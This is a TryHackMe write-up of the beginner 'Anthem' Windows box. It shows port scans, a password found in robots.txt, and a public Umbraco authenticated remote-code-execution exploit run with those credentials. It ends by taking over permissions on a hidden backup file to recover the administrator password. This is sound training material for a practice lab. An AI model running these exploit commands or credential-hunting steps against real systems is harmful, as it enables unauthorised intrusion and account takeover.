---
layout: project
type: project
image: images/writeups/thm/anthem/logo.jpg
title: Anthem - TryHackMe
permalink: writeups/anthem
# All dates must be YYYY-MM-DD format!
date: 2021-04-20
labels:
  - TryHackMe
  - boot2root
  - Easy
  - Windows
  - Umbraco
summary: Exploit a Windows machine in this beginner level challenge.
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/anthem/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = Anthem
TARGET = VARIABLE
OS = WINDOWS
DIFFICULTY = EASY
```

## Enumeration

Starting with a rustscan to quickly enumerate open ports

```bash
┌──(root💀Toyin)-[~/infosec/thm/anthem]
└─# rustscan -a 10.10.184.142 -b 1000 | tee rustscan
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.10.184.142:80
Open 10.10.184.142:3389
```

Passing the open ports into nmap to enumerate further

```bash
┌──(root💀Toyin)-[~/infosec/thm/anthem]
└─# nmap -T4 -A -p 80,3389 10.10.184.142 -oN nmap -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-28 21:24 WAT
Nmap scan report for 10.10.184.142
Host is up (0.24s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-LU09299160F
|   NetBIOS_Domain_Name: WIN-LU09299160F
|   NetBIOS_Computer_Name: WIN-LU09299160F
|   DNS_Domain_Name: WIN-LU09299160F
|   DNS_Computer_Name: WIN-LU09299160F
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-28T20:24:41+00:00
| ssl-cert: Subject: commonName=WIN-LU09299160F
| Not valid before: 2021-01-02T15:57:43
|_Not valid after:  2021-07-04T15:57:43
|_ssl-date: 2021-03-28T20:25:41+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   296.98 ms 10.8.0.1
2   297.85 ms 10.10.184.142

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.39 seconds
```

I went to the site while I had a nikto scan running in the background
Checking the posts I get some possible users and even an email
Checking the source of the page I got one of the flags

```
Jane Doe - JD@anthem.com
James Orchard Halliwell
```

The nikto scan showed that robots.txt had some entries in it. Using curl to get the contents.

```bash
┌──(root💀Toyin)-[~/infosec/thm/anthem]
└─# curl anthem.com/robots.txt
UmbracoIsTheBest!

# Use for all search robots
User-agent: *

# Define the directories not to crawl
Disallow: /bin/
Disallow: /config/
Disallow: /umbraco/
Disallow: /umbraco_client/
```

Umbraco is a “flexible open source .NET CMS”. 
After almost pulling my hair out to find the name of the administrator I just guessed the name of who the poem on the page was about, Solomon Grundy.
Following the same email pattern as Jane Doe, his email should be SG@anthem.com
I logged in using the password I found in robots.txt

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/anthem/1.png">

## Exploitation

I found the version by checking the help of the panel and got Umbraco v. 7.15.4. Searchsploit showed remote code execution vulnerabilities for this version

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/anthem/2.png">

```bash
┌──(root💀Toyin)-[~/infosec/thm/anthem]
└─# searchsploit umbraco
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Umbraco CMS - Remote Command Execution (Metasploit)                                                                                                                                                       | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                                                                | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                                                                | aspx/webapps/49488.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                                                                                                | php/webapps/44988.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results
```

Using the 3rd exploit and got remote code execution

```bash
┌──(root💀Toyin)-[~/infosec/thm/anthem]
└─# cp /usr/share/exploitdb/exploits/aspx/webapps/49488.py ./umbraco_rce.py
┌──(root💀Toyin)-[~/infosec/thm/anthem]
└─# python umbraco_rce.py -u sg@anthem.com -p UmbracoIsTheBest! -i 'http://anthem.com' -c powershell -a “whoami”
iis apppool\anthem

```

I enumerated the users on the machine and found user SG, which was probably solomon grundy. So i tried using remmina to login via rdp
I also played around with getting a reverse shell instead of using rdp but the antivirus was a pain and I don't know how to evade it YET.

```bash
┌──(root💀Toyin)-[~/infosec/thm/anthem]
└─# python2 umbraco_rce.py -u "sg@anthem.com" -p "UmbracoIsTheBest!" -i "http://anthem.com" -c powershell.exe -a "get-localuser"

Name               Enabled Description

----               ------- -----------

Administrator      True    Built-in account for administering the computer/domain

DefaultAccount     False   A user account managed by the system.

Guest              False   Built-in account for guest access to the computer/domain

SG                 True

WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
```

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/anthem/3.png">

## Privilege Escalation

I got the user.txt on the desktop.Following the hint about hidden files, I found a hidden folder named backup in C:\ and it contained a file named restore that I couldn't read.
For some reason I could enable inheritance and I got permissions to read the file

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/anthem/4.png">

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/anthem/5.png">

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/anthem/6.png">

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/anthem/7.png">

```
Administrator:ChangeMeBaby1MoreTime
```

I opened powershell admin with the credentials and got the root flag.

pwned